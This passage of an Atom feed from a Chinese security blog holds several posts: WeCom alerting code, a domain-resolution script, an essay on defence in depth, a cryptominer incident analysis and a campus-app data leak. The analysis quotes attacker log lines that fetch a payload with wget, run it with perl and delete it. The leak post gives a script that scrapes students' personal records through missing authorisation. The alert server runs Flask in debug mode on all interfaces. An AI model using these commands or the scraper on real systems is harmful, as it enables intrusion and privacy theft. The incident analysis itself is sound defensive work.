    <link href="https://rliyuqing.github.io/2019/08/22/27.%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E5%91%8A%E8%AD%A6%E4%BB%A5%E5%8F%8A%E5%9B%9E%E8%B0%83/"/>
    <id>https://rliyuqing.github.io/2019/08/22/27.企业微信告警以及回调/</id>
    <published>2019-08-22T04:00:00.000Z</published>
    <updated>2020-03-04T16:59:03.885Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="企业微信告警和回调"><a href="#企业微信告警和回调" class="headerlink" title="企业微信告警和回调"></a>企业微信告警和回调</h1><hr><p>最近正在参与一次护网行动，学到很多东西，等这次结束再来好好谈谈收获和总结吧，这都是后话了。这次主要分享一下企业微信的告警以及回调的实现以及踩的坑。<br>先说说前因后果吧，在护网行动正式开打之前，我们对xx公司也进行详细的网络情况了解，以及合作梳理。具体之后再说，反正结论就是网络边界的梳理和整顿都已经弄得比较不错了，唯一存在问题的就是在一些waf以及ids的告警上，因为策略全部default开启，导致出现大量的告警情况，为对攻击的分析以及响应带来很多麻烦，因此我们一部分工作在整理和梳理网络告警的方面。<br>他们一共有三个网络告警的设备，防火墙，ids，F5等，都是通过同一个zabbix发送请求到告警平台进行告警。于是我们在阿里云上建立了一个soc(安全运营中心)，上面搭了elk，zabbix将三个网络告警全部发送到这个elk上……..之后再说。最后将soc上整理之后的告警发送到企业微信，并达到通过在企业微信上回复消息，对ip进行增删黑名单的操作。<br>企业微信回调过程：</p><ol><li>创建企业微信应用：登录企业微信-&gt;应用与小程序-&gt;自建-&gt;创建应用</li><li>创建了之后<br><img src="https://upload-images.jianshu.io/upload_images/6269327-da186556fe2ffd5b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="111"><br>设置api接收进行。设置api接收时需要进行回调验证，部署好后面那个回调代码就行。<br>发送告警很简单。根据企业微信给的api文档说明以及示例代码可以写出来。我这里用的是python3：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2019/6/2</span></span><br><span class="line"><span class="comment"># @Author  : XDN01</span></span><br><span class="line"><span class="comment"># @Site    : www.raosong.cc</span></span><br><span class="line"><span class="comment"># @File    : sent_wexin.py</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line">from flask import Flask,request</span><br><span class="line">import json</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">@app.route(<span class="string">'/getmsg'</span>,methods=[<span class="string">'POST'</span>])</span><br><span class="line">def index():</span><br><span class="line">    corpid = <span class="string">"xxxxxxxxxxx"</span></span><br><span class="line">    secret = <span class="string">"xxxxxxxxxxxxxxxx"</span></span><br><span class="line">    agentid = <span class="string">"xxxxxxxxx"</span></span><br><span class="line">    <span class="comment">#if request.method == 'GET':</span></span><br><span class="line">     <span class="comment">#   return 'Deny'</span></span><br><span class="line">     <span class="comment">#接收POST的数据</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        <span class="keyword">if</span> request.form.get(<span class="string">'checkid'</span>) == <span class="string">'checkid'</span>:  <span class="comment"># 校验的id，避免有人恶意发送</span></span><br><span class="line">            GetMsg = request.form.get(<span class="string">'msg'</span>)</span><br><span class="line">            <span class="built_in">print</span>(GetMsg)</span><br><span class="line">            wechat = WeChat(corpid, secret, agentid)</span><br><span class="line">            <span class="keyword">if</span> wechat.send_message(GetMsg) == 1:</span><br><span class="line">                <span class="built_in">return</span> <span class="string">'Sent to weixin successed'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">return</span> <span class="string">'Failed'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">return</span> <span class="string">'Deny'</span></span><br><span class="line"></span><br><span class="line">class WeChat(object):</span><br><span class="line">    def __init__(self, corpid, secret, agentid):</span><br><span class="line">        self.url = <span class="string">"https://qyapi.weixin.qq.com"</span></span><br><span class="line">        self.corpid = corpid</span><br><span class="line">        self.secret = secret</span><br><span class="line">        self.agentid = agentid</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取企业微信的 access_token</span></span><br><span class="line">    def access_token(self):</span><br><span class="line">        url_arg = <span class="string">'/cgi-bin/gettoken?corpid=&#123;id&#125;&amp;corpsecret=&#123;crt&#125;'</span>.format(</span><br><span class="line">            id=self.corpid, crt=self.secret)</span><br><span class="line">        url = self.url + url_arg</span><br><span class="line">        response = requests.get(url=url)</span><br><span class="line">        text = response.text</span><br><span class="line">        self.token = json.loads(text)[<span class="string">'access_token'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构建消息格式</span></span><br><span class="line">    def messages(self, msg):</span><br><span class="line">        values = &#123;</span><br><span class="line">            <span class="string">"touser"</span>: <span class="string">'@all'</span>,</span><br><span class="line">            <span class="comment"># "toparty" : "PartyID1|PartyID2",   # 向这些部门发送  #'@all'给所有的发</span></span><br><span class="line">            <span class="string">"msgtype"</span>: <span class="string">'text'</span>,</span><br><span class="line">            <span class="string">"agentid"</span>: self.agentid,</span><br><span class="line">            <span class="string">"text"</span>: &#123;<span class="string">'content'</span>: msg&#125;,</span><br><span class="line">            <span class="string">"safe"</span>: 0</span><br><span class="line">        &#125;</span><br><span class="line">        self.msg = (bytes(json.dumps(values), <span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送信息</span></span><br><span class="line">    def send_message(self, msg):</span><br><span class="line">        self.access_token()</span><br><span class="line">        self.messages(msg)</span><br><span class="line">        send_url = <span class="string">'&#123;url&#125;/cgi-bin/message/send?access_token=&#123;token&#125;'</span>.format(url=self.url, token=self.token)</span><br><span class="line">        response = requests.post(url=send_url, data=self.msg)</span><br><span class="line">        errcode = json.loads(response.text)[<span class="string">'errcode'</span>]</span><br><span class="line">        <span class="keyword">if</span> errcode == 0:</span><br><span class="line">            <span class="built_in">return</span> 1</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">return</span> 0</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=8000,debug=True)</span><br></pre></td></tr></table></figure></li></ol><p>下面是用户将数据发送给企业微信上的应用，回调发送到soc上进行记录，这里是记录在文件中：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line">from flask import Flask,request</span><br><span class="line">from WXBizMsgCrypt import WXBizMsgCrypt</span><br><span class="line">import xml.etree.cElementTree as ET</span><br><span class="line">import sys</span><br><span class="line">from RedisUtil import RedisUtil</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">@app.route(<span class="string">'/weixin'</span>, methods=[<span class="string">'GET'</span>,<span class="string">'POST'</span>])</span><br><span class="line">def index():</span><br><span class="line">    sToken = <span class="string">'xxxxxxxx'</span></span><br><span class="line">    sEncodingAESKey = <span class="string">'xxxxxxxxxxxxxxxxx'</span></span><br><span class="line">    sCorpID = <span class="string">'xxxxxxxxxxxx'</span></span><br><span class="line">    wxcpt=WXBizMsgCrypt(sToken,sEncodingAESKey,sCorpID)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#获取url验证时微信发送的相关参数</span></span><br><span class="line">    sVerifyMsgSig=request.args.get(<span class="string">'msg_signature'</span>)</span><br><span class="line">    sVerifyTimeStamp=request.args.get(<span class="string">'timestamp'</span>)</span><br><span class="line">    sVerifyNonce=request.args.get(<span class="string">'nonce'</span>)</span><br><span class="line">    sVerifyEchoStr=request.args.get(<span class="string">'echostr'</span>)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    sReqMsgSig = sVerifyMsgSig</span><br><span class="line">    sReqTimeStamp = sVerifyTimeStamp</span><br><span class="line">    sReqNonce = sVerifyNonce</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    sResqMsgSig = sVerifyMsgSig</span><br><span class="line">    sResqTimeStamp = sVerifyTimeStamp</span><br><span class="line">    sResqNonce = sVerifyNonce</span><br><span class="line">    <span class="comment">#验证url</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        ret,sEchoStr=wxcpt.VerifyURL(sVerifyMsgSig, sVerifyTimeStamp,sVerifyNonce,sVerifyEchoStr)</span><br><span class="line">        <span class="keyword">if</span> (ret != 0 ):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"ERR: VerifyURL ret:"</span>,ret)</span><br><span class="line">            sys.exit(1)</span><br><span class="line">        <span class="built_in">return</span> sEchoStr</span><br><span class="line"></span><br><span class="line">    <span class="comment">#接收客户端消息</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        sReqMsgSig = sVerifyMsgSig</span><br><span class="line">        sReqTimeStamp = sVerifyTimeStamp</span><br><span class="line">        sReqNonce = sVerifyNonce</span><br><span class="line">        sReqData = request.data</span><br><span class="line"></span><br><span class="line">        ret,sMsg=wxcpt.DecryptMsg( sReqData, sReqMsgSig, sReqTimeStamp, sReqNonce)</span><br><span class="line">        <span class="keyword">if</span> (ret != 0):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"ERR: VerifyURL ret:"</span>)</span><br><span class="line">            sys.exit(1)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#解析发送的内容</span></span><br><span class="line">        xml_tree = ET.fromstring(sMsg)</span><br><span class="line">        content = xml_tree.find(<span class="string">"Content"</span>).text</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(content)</span><br><span class="line">        <span class="comment">#将接收到的内容记录在文件当中</span></span><br><span class="line">        f1 = open(<span class="string">'weixin_soc_get.txt'</span>, <span class="string">'a'</span>)</span><br><span class="line">        f1.writelines(content+<span class="string">"\n"</span>)</span><br><span class="line">        f1.close()</span><br><span class="line">        <span class="built_in">return</span> <span class="string">"OK"</span> <span class="comment"># 默认发送三次 ，接收到ok之后就不会重复发送</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=9999,debug=True)</span><br></pre></td></tr></table></figure></p><p>直接更改代码中的token和企业id什么的就能直接用，具体的可以参考官方文档<a href="https://work.weixin.qq.com/api/doc" target="_blank" rel="noopener">https://work.weixin.qq.com/api/doc</a><br>以及官方github库<a href="https://github.com/sbzhu/weworkapi_python" target="_blank" rel="noopener">https://github.com/sbzhu/weworkapi_python</a><br>带上官方这里给的是python2的，而且给的代码库还会有一些问题，主要就是WXBizMsgCrypt.py这个文件，具体的我已经进行更改，在我的github项目中，可以直接替换就行：<a href="https://github.com/rliyuqing/weworkapi_py3" target="_blank" rel="noopener">https://github.com/rliyuqing/weworkapi_py3</a><br>回调和发送信息创建的webserver用nginx代理就行，十分方便:<br><img src="https://upload-images.jianshu.io/upload_images/6269327-86b09a2184875ac7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="nginx代理"><br>统一端口开放很重要的。其他的内容下次在分享，主要刚刚把企业微信告警的来回的两条线走通，所以记录分享一下。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;企业微信告警和回调&quot;&gt;&lt;a href=&quot;#企业微信告警和回调&quot; cla
      
    
    </summary>
    
      <category term="日志/告警" scheme="https://rliyuqing.github.io/categories/%E6%97%A5%E5%BF%97-%E5%91%8A%E8%AD%A6/"/>
    
    
      <category term="日志/告警" scheme="https://rliyuqing.github.io/tags/%E6%97%A5%E5%BF%97-%E5%91%8A%E8%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>python根据域名获取ip</title>
    <link href="https://rliyuqing.github.io/2019/06/01/26.python%E6%A0%B9%E6%8D%AE%E5%9F%9F%E5%90%8D%E8%8E%B7%E5%8F%96ip/"/>
    <id>https://rliyuqing.github.io/2019/06/01/26.python根据域名获取ip/</id>
    <published>2019-06-01T04:00:00.000Z</published>
    <updated>2019-11-22T16:31:56.803Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="python根据域名获取ip"><a href="#python根据域名获取ip" class="headerlink" title="python根据域名获取ip"></a>python根据域名获取ip</h1><hr><p>过完年了，重新开始搬砖了。最近客户公司要进行全面的安全检测，于是给我们了一份很全的域名列表，然后让我们从外网进行简单的测试，但是这个域名实在是太多太多了，而且公司的域名很打一部分都是解析到内网的，外网根本无法访问，于是写了个简单的小脚本进行筛选，主要功能就是获取域名所对应的ip以及剔除解析到内网的域名。用队列和多线程的结构，速度能快很多，毕竟量上去了单线程还是很慢的。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2019/02/25</span></span><br><span class="line"><span class="comment"># @Author  : XDN01</span></span><br><span class="line"><span class="comment"># @Site    : www.raosong.cc</span></span><br><span class="line"><span class="comment"># @File    : get_public_ip.py</span></span><br><span class="line">import socket</span><br><span class="line">import csv</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">import queue</span><br><span class="line"></span><br><span class="line">q = queue.Queue()</span><br><span class="line">threading_num = 50</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">with open(<span class="string">"alldomain.txt"</span> , <span class="string">"r"</span>) as f:</span><br><span class="line">    filedata = f.readlines()</span><br><span class="line">    q.put(filedata)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line">def run():</span><br><span class="line">    <span class="keyword">while</span> not q.empty():</span><br><span class="line">        filedata = q.get()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> filedata:</span><br><span class="line">            url = str(i).replace(<span class="string">"\n"</span>,<span class="string">''</span>)</span><br><span class="line">            <span class="comment">#print(url)</span></span><br><span class="line">            try:</span><br><span class="line">                myaddr = socket.getaddrinfo(url, <span class="string">'http'</span>)</span><br><span class="line">                <span class="comment">#print(str(myaddr[0][4][0])[:3])</span></span><br><span class="line">                <span class="keyword">if</span> str(myaddr[0][4][0])[:3] != str(172):</span><br><span class="line">                    <span class="comment">#print(url+" "+str(myaddr[0][4][0]))</span></span><br><span class="line">                    <span class="comment">#value_array.append(url).append(str(myaddr[0][4][0]))</span></span><br><span class="line">                    with open(<span class="string">"public_domain.csv"</span>,<span class="string">"a"</span>) as fw:</span><br><span class="line">                        writer = csv.writer(fw)</span><br><span class="line">                        writer.writerow([url,str(myaddr[0][4][0])])</span><br><span class="line">            except:</span><br><span class="line">                <span class="comment">#print('can't open')</span></span><br><span class="line">                pass</span><br><span class="line">        <span class="comment">#f.close()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'begin'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threading_num):</span><br><span class="line">        t = threading.Thread(target=run)</span><br><span class="line">        t.start()</span><br><span class="line">        t.join()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'over'</span>)</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;python根据域名获取ip&quot;&gt;&lt;a href=&quot;#python根据域
      
    
    </summary>
    
      <category term="小脚本" scheme="https://rliyuqing.github.io/categories/%E5%B0%8F%E8%84%9A%E6%9C%AC/"/>
    
    
      <category term="小脚本" scheme="https://rliyuqing.github.io/tags/%E5%B0%8F%E8%84%9A%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>内网隔离和纵深防御浅谈</title>
    <link href="https://rliyuqing.github.io/2019/02/22/25.%E5%86%85%E7%BD%91%E9%9A%94%E7%A6%BB%E5%92%8C%E7%BA%B5%E6%B7%B1%E9%98%B2%E5%BE%A1%E6%B5%85%E8%B0%88/"/>
    <id>https://rliyuqing.github.io/2019/02/22/25.内网隔离和纵深防御浅谈/</id>
    <published>2019-02-22T04:00:00.000Z</published>
    <updated>2019-11-22T16:31:56.802Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="内网隔离和纵深防御浅谈"><a href="#内网隔离和纵深防御浅谈" class="headerlink" title="内网隔离和纵深防御浅谈"></a>内网隔离和纵深防御浅谈</h1><hr><p>今天在给客户的公司做日常的测试的时候发现了一个内网的系统对外开放了，本来这是一件挺正常的事情，因为企业总会出现各种生产环境的一些或大或小的变动，可能某些时候就会出现某个不该对外开放的系统对外开放了，但是因为都有验证甚至二次验证，所以安全隐患不是很高。这次的这个客户企业的机器之前也出现过几次内网系统对外网公开了，但是都没有用什么大的威胁，外网的可操作性也很少，爆破账号密码都十分的困难。但是这次的对外开放的这个系统竟然出现了可以直接匿名用户登录并web端执行脚本的情况，虽然匿名用户没有执行sh脚本的额权限，但是有执行python脚本的权限，可以直接反弹shell，于是赶紧联系了老板，与客户公司取得联系及时修复漏洞。<br>是一个Zeppelin的线上系统的匿名用户登录的情况。为什么这次要特点说一说这次遇到的情况呢？因为这是我所期待，也是预料之中会出现的情况。<br>之前在客户的公司实习了一段时间。再去客户的公司事实习之前，自己也对他们有一些简单的测试，发现他们内外网隔离做的很好，改对外开放的对外开放，不该对外开放的一个都访问不了。但是在公司实习的时候，进入内网之后才发现内网的各种系统还是很乱的，许多系统为了方便都是没有验证机制的，甚至连企业的wiki文档系统都不需要验证员工身份，里面许多敏感文件。这就让我想起了之前老板和我们说过的，那些表面安全工作做得很好的内部可能漏洞百出，在实习的两个礼拜内，企业内部的src也是刷了很多。所以我觉得肯定会出现问题，只有某个系统因为谋些环境变动而对外网开放，就很容易被攻击者轻松日穿。<br>其实这也是企业发展的正常道路，客户公司也是最近才成立安全部门的，在资源有限的情况下优先做好内外网隔离是个正确的选择。但是只做内网隔离不做纵深防御是错误的。<br>做好内网隔离是企业安全的基础，在资源有限的情况下优先做内网隔离，但是纵深防御也是十分必要的。认为做好了隔离而忽略了内网的防御，就很容易出现一旦有机器在公网暴露就会被轻松攻破。风险分析的模型不止包括事件发生的概率，还有产生的危险程度。低概率但是带来严重影响的攻击也是会出现高风险值。资源有限的情况也需要考虑到资源的合理分配了，优先做隔离是资源最大化利用的有效手段。<br>优先做隔离没有错，只做隔离却没有做纵深防御是错的</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;内网隔离和纵深防御浅谈&quot;&gt;&lt;a href=&quot;#内网隔离和纵深防御浅谈&quot;
      
    
    </summary>
    
      <category term="安全知识" scheme="https://rliyuqing.github.io/categories/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="安全知识" scheme="https://rliyuqing.github.io/tags/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>一次挖矿病毒攻击分析</title>
    <link href="https://rliyuqing.github.io/2018/10/15/24.%E4%B8%80%E6%AC%A1%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/"/>
    <id>https://rliyuqing.github.io/2018/10/15/24.一次挖矿病毒攻击分析/</id>
    <published>2018-10-15T04:00:00.000Z</published>
    <updated>2019-11-22T16:31:56.801Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="一次挖矿病毒攻击分析"><a href="#一次挖矿病毒攻击分析" class="headerlink" title="一次挖矿病毒攻击分析"></a>一次挖矿病毒攻击分析</h1><hr><p>这两天期末了，最近老板这里突然来了个任务，客户服务器被攻击了，某台机器的cpu一直都跑满了，持续高负荷状态，客户公司的运营实在没有办法找到了我们。<br>先说一说之前这台服务器也出现过问题，被两波人搞过，一波写了webshell，另个一种了挖矿病毒，都被清除了，当然这些我都没有参与。<br>因为老板比较忙，我和另一个小伙伴接手进行分析，我们拿到这台服务器，既然是web服务器，最好得最有效的办法就是看web日志，但是这个日志是在很多，这就考虑经验问题了，另一个小伙伴道行比我深，他发现了痕迹：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat aso_access.log | grep <span class="string">"wget"</span> | grep <span class="string">"/2019"</span>|grep <span class="string">"200"</span></span><br></pre></td></tr></table></figure></p><p>通过很多尝试，在筛选“wget”的时候找到了攻击痕迹。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ xxx.xxx.xxx.xxx - - [xx/xx/2019:xx:xx:xx +0800] <span class="string">"POST /?module=wget [http://xxx.xxx.xxx.xxx/ibus](http://xxx.xxx.xxx.xxx/ibus) -O /tmp/6b5a412bb56c0f0af33017cc88718de3 HTTP/1.1"</span> 200 2979 <span class="string">"-"</span> <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0"</span></span><br></pre></td></tr></table></figure></p><p>emmmmm，看到这个POST的请求，基本可以猜测出就是这几天爆出的thinkphp新的rce，具体读者可以去看看相关的报告，rce的分析网上也有了，有想去的可以去了解一下。根据这条日志，筛选ip我们找到了具体的攻击痕迹：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ xxx.xxx.xxx.xxx - - [xx/xx/2019:xx:xx:xx +0800] <span class="string">"POST /?module=wget [http://xxx.xxx.xxx.xxx/ibus](http://xxx.xxx.xxx.xxx/ibus) -O /tmp/6b5a412bb56c0f0af33017cc88718de3 HTTP/1.1"</span> 200 2979 <span class="string">"-"</span> <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0"</span></span><br></pre></td></tr></table></figure></p><p>上传ibus脚本文件到tmp目录下命名为指定文件，这里www用户有对tmp目录的读写权限。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ xxx.xxx.xxx.xxx - -  [xx/xx/2019:xx:xx:xx +0800]  <span class="string">"POST /?module=perl /tmp/6b5a412bb56c0f0af33017cc88718de3;sleep 2;rm -rf /tmp/6b5a412bb56c0f0af33017cc88718de3 HTTP/1.1"</span> 200 3699 <span class="string">"-"</span> <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0"</span></span><br></pre></td></tr></table></figure></p><p>执行tmp中上传的指定文件，并等待执行完成，删除文件.<br>本地虚拟环境执行了一下这个ibus脚本：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-c63d320e2b0401d1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="本地执行脚本"><br>可以看到这里执行生成了三个sh简单加密的脚本文件：nmi，nbus和.dbus是哪个文件，这三个脚本文件解密之后是三个cat和perl的脚本，分别执行了一下命令：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat /xxx/xxx/xxx/xxx/Favicon.ico | perl</span><br><span class="line">$ cat /xxx/xxx/pkcs | perl</span><br><span class="line">$ cat /xxx/xxx/xxx/xxxxx/xxx/xxxxxx/mockup | perl</span><br></pre></td></tr></table></figure></p><p>执行了三个perl脚本，就是挖矿的脚本了。最后我们把生成的恶意文件备份之后就进行清除了，总共是三个sh脚本，三个perl挖矿脚本和两个记录id的随机数之类的文件。<br>怎么说呢，这次攻击分析看似挺简单的，但是最难的部分，从日志里找出攻击者的恶意访问是很困难的，需要有很多的经验，比如对最近新漏洞的了解，以及各类典型漏洞的攻击方式，才能及时的从庞大的日志文件中根据特征找到攻击者的痕迹。<br>安全从业者还是十分吃经验的，博主也会更多的在实战中历练自己，也会分享记录自己的经验。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;一次挖矿病毒攻击分析&quot;&gt;&lt;a href=&quot;#一次挖矿病毒攻击分析&quot; c
      
    
    </summary>
    
      <category term="攻击分析" scheme="https://rliyuqing.github.io/categories/%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/"/>
    
    
      <category term="攻击分析" scheme="https://rliyuqing.github.io/tags/%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>校园提供给第三方的接口信息泄露</title>
    <link href="https://rliyuqing.github.io/2018/08/02/23.%E6%A0%A1%E5%9B%AD%E6%8F%90%E4%BE%9B%E7%BB%99%E7%AC%AC%E4%B8%89%E6%96%B9%E7%9A%84%E6%8E%A5%E5%8F%A3%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    <id>https://rliyuqing.github.io/2018/08/02/23.校园提供给第三方的接口信息泄露/</id>
    <published>2018-08-02T04:00:00.000Z</published>
    <updated>2019-11-22T16:31:56.800Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="校园提供给第三方的接口信息泄露"><a href="#校园提供给第三方的接口信息泄露" class="headerlink" title="校园提供给第三方的接口信息泄露"></a>校园提供给第三方的接口信息泄露</h1><hr><p>之前学校和第三方合作，让我们用到的某款app，好奇测试，发现其有严重的身份验证缺失，可以随意访问个人信息，用python写了个可以爬取所有信息的脚本。（很早之前的了，做个记录）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Time    : 2018/6/23</span><br><span class="line"># @Author  : XDN01</span><br><span class="line"># @Site    : www.raosong.cc</span><br><span class="line"># @File    : xd-xiaoweiapp-spider.py</span><br><span class="line">import requests</span><br><span class="line">import csv</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">with open(&quot;./spider.csv&quot;,&quot;w&quot;,encoding=&apos;utf-8&apos;) as f:</span><br><span class="line">    writer = csv.writer(f)</span><br><span class="line">    key_array = [&apos;userId&apos;,&apos;userNum&apos;,&apos;name&apos;,&apos;sex&apos;,&apos;address&apos;,&apos;certificate&apos;,&apos;nationId&apos;,&apos;nationName&apos;,</span><br><span class="line">   &apos;phone&apos;,&apos;email&apos;,&apos;schoolName&apos;,&apos;faculty&apos;,&apos;grade&apos;,&apos;class&apos;,&apos;profession&apos;,&apos;sysStuDetailId&apos;,&apos;sourceId&apos;,</span><br><span class="line">    &apos;sourceName&apos;,&apos;feature&apos;,&apos;type&apos;,&apos;suspId&apos;]</span><br><span class="line">    writer.writerow(key_array)</span><br><span class="line"></span><br><span class="line">    for a in range(2,20):</span><br><span class="line">        url = &apos;http://example.com/search.php?userId=&#123;&#125;&apos;.format(a)</span><br><span class="line">        json_data =requests.get(url).json()[&apos;data&apos;]</span><br><span class="line">        # print(json_data)</span><br><span class="line">        value_array = []</span><br><span class="line">        for k in key_array:</span><br><span class="line">            if k in json_data:</span><br><span class="line">                value_array.append(json_data[k])</span><br><span class="line">            else:</span><br><span class="line">                value_array.append(&apos;null&apos;)</span><br><span class="line">        # print(value_array)</span><br><span class="line">        writer.writerow(value_array)</span><br><span class="line">        print(&apos;第&#123;&#125;条数据写入完成&apos;.format(a-1))</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;校园提供给第三方的接口信息泄露&quot;&gt;&lt;a href=&quot;#校园提供给第三方
      
    
    </summary>
    
      <category term="水平权限" scheme="https://rliyuqing.github.io/categories/%E6%B0%B4%E5%B9%B3%E6%9D%83%E9%99%90/"/>
    
    
      <category term="水平权限" scheme="https://rliyuqing.github.io/tags/%E6%B0%B4%E5%B9%B3%E6%9D%83%E9%99%90/"/>
    
  </entry>
  
  <entry>
    <title>PCI-DSS(V3.2)学习笔记(八)</title>
    <link href="https://rliyuqing.github.io/2018/06/10/21.%20PCI-DSS(V3.2.1)%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%85%AB)/"/>
    <id>https://rliyuqing.github.io/2018/06/10/21. PCI-DSS(V3.2.1)学习笔记(八)/</id>
    <published>2018-06-10T04:00:00.000Z</published>
    <updated>2019-11-22T16:31:56.799Z</updated>
    
